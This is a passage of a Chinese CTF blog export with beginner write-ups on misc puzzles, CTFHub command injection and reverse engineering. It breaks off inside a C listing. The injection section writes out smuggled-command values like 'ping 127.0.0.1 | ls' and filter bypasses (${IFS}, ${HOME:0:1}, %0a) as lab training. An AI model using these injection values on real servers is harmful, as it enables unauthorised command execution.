<p>分析了半天图片没有啥隐写，一度陷入了僵局。后来一想，这不会是二进制吧，于是白色代表0，黑色代表1，看了看，发现一共104张图片，是8的倍数，那就是8位一个字节。写个脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">message=[<span class="number">0b1100110</span>,<span class="number">0b1101100</span>,<span class="number">0b1100001</span>,<span class="number">0b1100111</span>,<span class="number">0b1111011</span>,<span class="number">0b1000110</span>,<span class="number">0b1110101</span>,<span class="number">0b1001110</span>,<span class="number">0b1011111</span>,<span class="number">0b1100111</span>,<span class="number">0b1101001</span>,<span class="number">0b1000110</span>,<span class="number">0b1111101</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(message)):</span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">chr</span>(message[i]),end = <span class="string">&quot;&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#得出结果：   flag&#123;FuN_giF&#125;</span></span><br></pre></td></tr></table></figure>
<h1 id="掀桌子">掀桌子</h1>
<p>题目描述：菜狗截获了一份报文如下c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2，生气地掀翻了桌子(╯°□°）╯︵
┻━┻</p>
<p>这题毫无思路，各种能想到的加密的方法都试着解了一下发现没有用。后来终于知道原来是两个一组转成二进制再转成ASCII码。</p>
<p>用JPK转码：</p>
<img src="/2019/08/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/68b0bc0367d872787f75b707f8651bfc.png" class="">
<p>先转成七位二进制（inradix为16，outradix为2，BitsPerBlock为7）：</p>
<img src="/2019/08/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/604277f614e16d9b2655aff98f6a1209.png" class="">
<p>为什么是七位呢，因为ASCII码就用到7位。然后再转成ASCII码：</p>
<img src="/2019/08/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/626be0972cfd0387b2366772b6370555.png" class="">
<p>最后加上flag{}就可以得到flag。</p>
<h1 id="如来十三掌">如来十三掌</h1>
<p>题目描述：菜狗为了打败菜猫，学了一套如来十三掌。</p>
<p>下下来个doc，打开看一下：</p>
<img src="/2019/08/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/9d2acf0a07f95ae21775f8e888c90183.png" class="">
<p>没啥头绪，UE打开一看，发现是个zip，所以改文件的后缀为zip打开压缩包，里面有好多文件，全是xml文件：</p>
<img src="/2019/08/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/3686b451daef669ab2149897fd4f7f40.png" class="">
<p>挨个打开看了看，没有啥发现，只在一个文件里看到了类似flag的东西：</p>
<img src="/2019/08/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1d88d83452535af26dc293573b52cdae.png" class="">
<p>提交上去也是错的。</p>
<p>后来，我发现有个这<a
href="http://keyfc.net/bbs/tools/tudoucode.aspx">网站</a>:</p>
<img src="/2019/08/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/e3c33c15b16d75396909fdab4ef8862b.png" class="">
<p>wdnmd这谁顶得住啊。解密一下：</p>
<img src="/2019/08/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/cb2bfab2d42a916479e2797f244ac4c9.png" class="">
<p>得到一个字符串，再rot13解码（十三掌），再base64解码得到flag</p>
<p><code>flag&#123;bdscjhbkzmnfrdhbvckijndskvbkjdsab&#125;</code></p>
<p>其实后来我才知道，doc本身就是一个压缩包，就像apk一样。</p>
<h1 id="base64stego">base64stego</h1>
<p>题目描述：菜狗经过几天的学习，终于发现了如来十三掌最后一步的精髓</p>
<p>下载下来的压缩包居然要密码，搞了半天不知道密码是啥，后来用winrar修复了一下，好了……能打开了。
:han:</p>
<p>打开里面的txt，发现全是base64加密的字符串：</p>
<img src="/2019/08/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/0b452e55a1920a85eb40d837ad849df6.png" class="">
<p>解密后发现是一段关于隐写术的介绍。那看来是base64隐写了。</p>
<p>关于base64隐写，可以看这篇文章：<a
href="https://www.jianshu.com/p/48fe4dd3e5ce">base64隐写</a>，这里暂时就不展开来讲了。</p>
<p>解密后加上flag{}就可以得到flag。</p>
<p><code>flag&#123;Base_sixty_four_point_five&#125;</code></p>
<h1 id="功夫再高也怕菜刀">功夫再高也怕菜刀</h1>
<p>题目描述：菜狗决定用菜刀和菜鸡决一死战</p>
<p>附件给了个流量包，foremost分离得到一个zip文件，但是有密码，所以得找到密码。</p>
<p>分析流量包，wireshark按<code>Ctrl</code>+<code>f</code>，搜索字符串flag，分组选择分组字节流，在找flag的过程中找到一个6666.jpg</p>
<img src="/2019/08/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/481e32a111ca3c988e848112a561bef8.png" class="">
<p>追踪该tcp流：</p>
<img src="/2019/08/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/0b79c78f516a5f75d162f21d381203d4.png" class="">
<p>现在我们要把jpg搞下来，jpg文件头是FFD8，文件尾是FFD9，找到FFD8，和最后一个FFD9，把中间的数据复制下来，在winhex里粘贴并保存为jpg，注意粘贴的时候格式选择ASCII
Hex。</p>
<img src="/2019/08/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/856020ab1a06e767e64cefbf4b4ab84e.png" class="">
<p>打开发现了密码：</p>
<img src="/2019/08/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/2a82fb3fa956480457f557175cab662d.png" class="">
<p>解压zip打开flag.txt得到flag</p>
<p><code>flag&#123;3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z&#125;</code></p>
<h1 id="stegano">stegano</h1>
<p>题目描述：菜狗收到了图后很开心，玩起了pdf</p>
<p>下载pdf后wps打开，<code>Ctrl</code>+<code>a</code>，<code>Ctrl</code>+<code>c</code>复制，粘贴在notepad++里看一下，发现这样的字段：</p>
<img src="/2019/08/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/c809aaa93b5ec50c85071cc860807c5d.png" class="">
<p>感觉像是摩斯电码，把A变成.把B变成-试一下（我也不知道哪个对应.就随便试，反正就两种情况）。</p>
<img src="/2019/08/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/72636e0c4b94af8a162642f50212e99e.png" class="">
<p>结果咋提交都不对，看网上的WP和我结果一样，结果我就是不对。后来换了一个解码的解码，得到的是小写的结果。提交就对了。</p>
<p>得到flag：<code>1nv151bl3m3554g3</code></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>misc</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>cthub技能树_web_RCE之命令注入</title>
    <url>/2020/07/31/CTF/cthub%E6%8A%80%E8%83%BD%E6%A0%91-web-RCE%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="命令注入">命令注入</h1>
<p><img src="/2020/07/31/CTF/cthub技能树-web-RCE之命令注入/image-20200730205313234.png"  alt="image-20200730205313234" style="zoom: 67%;" /></p>
<p>进入题目，题目中给出了源码：</p>
<img src="/2020/07/31/CTF/cthub%E6%8A%80%E8%83%BD%E6%A0%91-web-RCE%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200730205758156.png" class="" title="image-20200730205758156">
<p>我们随便输入一个ip看看输出结果：</p>
<img src="/2020/07/31/CTF/cthub%E6%8A%80%E8%83%BD%E6%A0%91-web-RCE%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200730205859577.png" class="" title="image-20200730205859577">
<p>可以看到返回了执行<code>ping -c 4 127.0.0.1</code>的结果。同时发现这个网页使用的是get请求：</p>
<img src="/2020/07/31/CTF/cthub%E6%8A%80%E8%83%BD%E6%A0%91-web-RCE%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200730210440289.png" class="" title="image-20200730210440289">
<p>那如果我们可以让服务器不执行ping命令，而执行我们需要的命令让服务器将结果回显，不就相当于我们有了一个webshell吗！这就是命令注入的意思。我们可以通过管道符来实现。</p>
<p>linux支持多种管道符：</p>
<table>
<colgroup>
<col style="width: 9%" />
<col style="width: 90%" />
</colgroup>
<thead>
<tr class="header">
<th>管道符</th>
<th>用法</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>;</td>
<td>执行完前面语句再执行后面的。如ping 127.0.0.1; ls</td>
</tr>
<tr class="even">
<td>|</td>
<td>显示后面语句的执行结果。如ping 127.0.0.1 | ls</td>
</tr>
<tr class="odd">
<td>||</td>
<td>前面语句出错时执行后面语句。如ping 127.0.0.1 || ls</td>
</tr>
<tr class="even">
<td>&amp;</td>
<td>前面语句为假则执行后面语句。如ping 127.0.0.1 &amp; ls</td>
</tr>
<tr class="odd">
<td>&amp;&amp;</td>
<td>前面语句为假则报错，为真则执行后面语句。如ping 127.0.0.1 &amp;&amp;
ls</td>
</tr>
</tbody>
</table>
<p>我们使用 <code>|</code>进行注入，可以看到返回了ls的结果：</p>
<img src="/2020/07/31/CTF/cthub%E6%8A%80%E8%83%BD%E6%A0%91-web-RCE%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200730210948859.png" class="" title="image-20200730210948859">
<p>我们看看那个奇怪的php文件，发现没有回显，看看源码（这个地方坑了我很长时间，后面的题最终都需要查看源码），得到flag：</p>
<img src="/2020/07/31/CTF/cthub%E6%8A%80%E8%83%BD%E6%A0%91-web-RCE%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200730211234543.png" class="" title="image-20200730211234543">
<h1 id="过滤cat">过滤cat</h1>
<p><img src="/2020/07/31/CTF/cthub技能树-web-RCE之命令注入/image-20200730211439573.png"  alt="image-20200730211439573" style="zoom:67%;" /></p>
<p>对于命令注入的题目，主要考察的就是各种过滤的绕过，这道题就是考察cat过滤的绕过。</p>
<p>首先查看flag文件名：</p>
<img src="/2020/07/31/CTF/cthub%E6%8A%80%E8%83%BD%E6%A0%91-web-RCE%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200730221846743.png" class="" title="image-20200730221846743">
<p>读取文件可以使用more、head等命令。关于linux的文本读取命令，可以看看这篇文章：<a
href="https://blog.csdn.net/xiaojiesu/article/details/45442411">Linux读取文本常用命令</a>。本题我使用more命令，得到flag</p>
<img src="/2020/07/31/CTF/cthub%E6%8A%80%E8%83%BD%E6%A0%91-web-RCE%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200730222246812.png" class="" title="image-20200730222246812">
<p>由于后面的题目均考察不同内容的过滤，所以非重点的图片等就不再放上来了。</p>
<h1 id="过滤空格">过滤空格</h1>
<p>这次我们要绕过空格，绕过空格有很多种方法。我们可以使用我们可以使用<code>$&#123;IFS&#125;</code>来表示空格，IFS是shell中的一个变量，关于IFS的资料，可以看这篇文章（强烈推荐看看）：<a
href="https://blog.csdn.net/guyongqiangx/article/details/80220434">详细解析Shell中的IFS变量</a>。</p>
<p>我们在命令中就用IFS来替换空格：</p>
<img src="/2020/07/31/CTF/cthub%E6%8A%80%E8%83%BD%E6%A0%91-web-RCE%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200730223159084.png" class="" title="image-20200730223159084">
<p>得到flag：</p>
<img src="/2020/07/31/CTF/cthub%E6%8A%80%E8%83%BD%E6%A0%91-web-RCE%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200730223441299.png" class="" title="image-20200730223441299">
<h1 id="过滤目录分隔符">过滤目录分隔符</h1>
<p>目录分隔符<code>/</code>我们可以使用<code>$HOME</code>代替，HOME也是shell中的一个环境变量，表示当前用户的根目录，我们可以看看当前用户的HOME值是什么</p>
<img src="/2020/07/31/CTF/cthub%E6%8A%80%E8%83%BD%E6%A0%91-web-RCE%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200731173205285.png" class="" title="image-20200731173205285">
<p>可以看到当前用户的根目录是/home/www-data，我们只需要/，所以我们可以用${HOME:0:1}来实现</p>
<img src="/2020/07/31/CTF/cthub%E6%8A%80%E8%83%BD%E6%A0%91-web-RCE%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200731181313922.png" class="" title="image-20200731181313922">
<p>首先查看flag位置：</p>
<img src="/2020/07/31/CTF/cthub%E6%8A%80%E8%83%BD%E6%A0%91-web-RCE%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200731172616367.png" class="" title="image-20200731172616367">
<img src="/2020/07/31/CTF/cthub%E6%8A%80%E8%83%BD%E6%A0%91-web-RCE%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200731172934380.png" class="" title="image-20200731172934380">
<p>读取flag：</p>
<img src="/2020/07/31/CTF/cthub%E6%8A%80%E8%83%BD%E6%A0%91-web-RCE%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200731181418868.png" class="" title="image-20200731181418868">
<img src="/2020/07/31/CTF/cthub%E6%8A%80%E8%83%BD%E6%A0%91-web-RCE%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200731181428086.png" class="" title="image-20200731181428086">
<h1 id="过滤运算符">过滤运算符</h1>
<p>这道题过滤了 | 和 &amp;，我们可以使用 ; 进行注入：</p>
<img src="/2020/07/31/CTF/cthub%E6%8A%80%E8%83%BD%E6%A0%91-web-RCE%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200731181801768.png" class="" title="image-20200731181801768">
<p>直接cat得到flag：</p>
<img src="/2020/07/31/CTF/cthub%E6%8A%80%E8%83%BD%E6%A0%91-web-RCE%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200731181837629.png" class="" title="image-20200731181837629">
<h1 id="综合过滤练习">综合过滤练习</h1>
<p>首先看一下过滤的符号有哪些：</p>
<img src="/2020/07/31/CTF/cthub%E6%8A%80%E8%83%BD%E6%A0%91-web-RCE%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200731181939756.png" class="" title="image-20200731181939756">
<p>过滤了 | &amp; ; 空格 / cat flag ctfhub这些符号</p>
<p>我们可以使用%0a（换行符的url编码）来绕过运算符：</p>
<img src="/2020/07/31/CTF/cthub%E6%8A%80%E8%83%BD%E6%A0%91-web-RCE%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200731182638296.png" class="" title="image-20200731182638296">
<p>字符串的绕过我们可以使用反斜杠 ，如flag变成fl：</p>
<img src="/2020/07/31/CTF/cthub%E6%8A%80%E8%83%BD%E6%A0%91-web-RCE%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200731182804769.png" class="" title="image-20200731182804769">
<p>读取flag：</p>
<img src="/2020/07/31/CTF/cthub%E6%8A%80%E8%83%BD%E6%A0%91-web-RCE%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200731183029022.png" class="" title="image-20200731183029022">
<img src="/2020/07/31/CTF/cthub%E6%8A%80%E8%83%BD%E6%A0%91-web-RCE%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200731183037672.png" class="" title="image-20200731183037672">
<p>至此，我们就完成了命令注入的技能树，可以看到命令注入主要考察的就是各种绕过姿势，本文主要针对题目来讲，这里再放一些命令注入绕过姿势的总结文章，供大家参考和学习：</p>
<p><a
href="%5Bhttps://www.smi1e.top/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/%5D(https://www.smi1e.top/命令注入绕过姿势/)">命令注入绕过姿势</a></p>
<p><a
href="https://www.cnblogs.com/NPFS/p/13279815.html">命令执行绕过小技巧</a></p>
<p><a
href="https://www.cnblogs.com/micr067/p/12590152.html">命令注入绕过技巧总结</a></p>
<p><a
href="https://blog.csdn.net/qq_45552960/article/details/104576189">关于命令执行/注入
以及常见的一些绕过过滤的方法</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
        <tag>ctfhub</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界逆向新手训练</title>
    <url>/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/</url>
    <content><![CDATA[<p>本来是搞Web的（虽然菜的抠脚），但是战队缺reverse和pwn的人，正好自己对这方面也很有兴趣，于是就转了方向。刚学几天，先做上几道攻防世界的新手训练题。把自己做题的过程和学到的知识记录下来。由于我在做的过程中很多时候都是瞎试试出来的，所以记录的时候分成两部分，第一部分是【做题实录】，就是我做题的真实思考过程，flag可能是瞎猜猜出来的，有很多的运气成分在。第二部分是【分析总结】，是我在网上查阅大佬的“正确做法”，即通过分析和思考，用正统做法得出flag。分析总结中我会把我复现的写出来。由于我实在是逆向小白，可能大部分都是靠运气做出来的，大佬勿喷，估计以后再回头看自己的解法自己都要笑死了。</p>
<h1 id="re1">re1</h1>
<p>题目描述：菜鸡开始学习逆向工程，首先是最简单的题目</p>
<h2 id="做题实录">做题实录</h2>
<p>双击点开，让我输入flag</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565360175669.png" class="" width="1565360175669">
<p>随便输一个：</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565360208916.png" class="" width="1565360208916">
<p>看样子是要比较字符串的，放到OD里面看看，找到了比较字符串的地方，下断点</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565360371101.png" class="" width="1565360371101">
<p>随便输入什么字符之后继续往下走，发现flag已经进入到了ESP中</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565360501795.png" class="" width="1565360501795">
<h2 id="分析总结">分析总结</h2>
<p>这个题非常简单，没什么好说的，其实放到OD里还可以直接搜索字符串，一步到位……</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565360834492.png" class="" width="1565360834492">
<p>当然了，还可以用IDA直接看源码</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565361318963.png" class="" width="1565361318963">
<p>看到<code>strcmp()</code>函数，输入的是v9，和v5比较，所以数据就应该在v5里面，再看第10行，把<code>xmmword_413E34</code>的值赋给v5，所以双击<code>xmmword_413E34</code>看它的数据。把<code>qword_413E44</code>和<code>xmmword_413E34</code>的数据拼起来</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565361586179.png" class="" width="1565361586179">
<p>你可以把<code>qword_413E44</code>和<code>xmmword_413E34</code>的数据拼起来用python把16进制的数转化成文本然后反向写出flag就可以了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;7D4654435455443074656D30633165577B465443545544&#x27;</span>.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"><span class="comment"># 解码结果：   &#125;FTCTUD0tem0c1eW&#123;FTCTUD</span></span><br></pre></td></tr></table></figure>
<p>或者光标点击<code>xmmword</code>的数据，按下a键，</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565362998384.png" class="" width="1565362998384">
<p>确认就可以直接把它转化成字符串。（我也是后来才知道的，看来ida还是要好好学）</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565363024355.png" class="" width="1565363024355">
<h1 id="game">game</h1>
<p>题目描述：菜鸡最近迷上了玩游戏，但它总是赢不了，你可以帮他获胜吗</p>
<h2 id="做题实录-1">做题实录</h2>
<p>一个exe文件，打开如下：</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565417874449.png" class="" width="1565417874449">
<p>让你玩游戏，赢了就有flag，于是<del>玩三个小时玩通关拿到flag</del>。放到OD里动态调试</p>
<p>一路走到这里让你输入n，估计接下来就是字符串比较了，随便输一个继续调试</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565418367023.png" class="" width="1565418367023">
<p>这部分一整段都在判断灯的情况，调试的过程中发现只要判断出灯没有全亮，就会跳转回003EF4FB，没有进入game.003E7AB4，所以猜测是成功了就进入这里，于是进去看看</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565418838983.png" class="" width="1565418838983">
<p>进来之后，果不其然，是成功的函数</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565419406338.png" class="" width="1565419406338">
<p>接下来就运行这个函数，就可以得到flag</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565419538116.png" class="" width="1565419538116">
<h2 id="分析总结-1">分析总结</h2>
<p>这个题还是比较简单的，没啥好说的。再用IDA来试一下</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565419925277.png" class="" width="1565419925277">
<p>进入<code>main_0()</code>函数，看到判断语句，逻辑很简单</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565419996445.png" class="" width="1565419996445">
<p>进入<code>sub_457AB4()</code></p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565420082978.png" class="" width="1565420082978">
<p>这个程序就疯狂跳转，不知道要干啥</p>
<p>进去之后就是这样</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565420136904.png" class="" width="1565420136904">
<p>可以直接写个脚本跑，在这里我选择改程序的逻辑，让它跳过判断直接执行这个函数</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565420760854.png" class="" width="1565420760854">
<p>这一部分就是判断语句，只要把<code>cmp edx, 1</code>改成<code>cmp edx edx</code>那么条件就恒为真。</p>
<blockquote>
<p><strong>特别注意</strong>的是：<code>cmp edx, 1</code>占3个字节而<code>cmp edx edx</code>占两个字节，所以最后一个字节用<code>nop</code>填充。否则会出错</p>
</blockquote>
<p>修改后如下：</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565423173098.png" class="" width="1565423173098">
<p>保存之后双击运行，随便输入一个n，就可以得出flag</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565423246933.png" class="" width="1565423246933">
<h1 id="helloctf">Hello，CTF</h1>
<p>题目描述：菜鸡发现Flag似乎并不一定是明文比较的</p>
<h2 id="做题实录-2">做题实录</h2>
<p>一个exe，运行结果如下：</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1567821831010.png" class="" width="1567821831010">
<p>要找序列号，IDA看一下：</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1567822212906.png" class="" width="1567822212906">
<p>看来flag就是这个绿色的字符串了，看到有字母有数字且字母不超过f，所以16进制解码试一下，得到flag：</p>
<p>CrackMeJustForFun</p>
<h2 id="分析总结-2">分析总结</h2>
<p>这个题比较简单，我开始是用动态调试做的，都差不多，只要看到这个字符串基本上就可以解决了。</p>
<h1 id="open-source">open-source</h1>
<p>题目描述：菜鸡学逆向学得头皮发麻，终于它拿到了一段源代码</p>
<h2 id="做题实录-3">做题实录</h2>
<p>源代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">4</span>) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;what?\n&quot;</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> first = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span> (first != <span class="number">0xcafe</span>) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;you are wrong, sorry.\n&quot;</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> second = atoi(argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">if</span> (second % <span class="number">5</span> == <span class="number">3</span> || second % <span class="number">17</span> != <span class="number">8</span>) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;ha, you won&#x27;t get it!\n&quot;</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="string">&quot;h4cky0u&quot;</span>, argv[<span class="number">3</span>])) 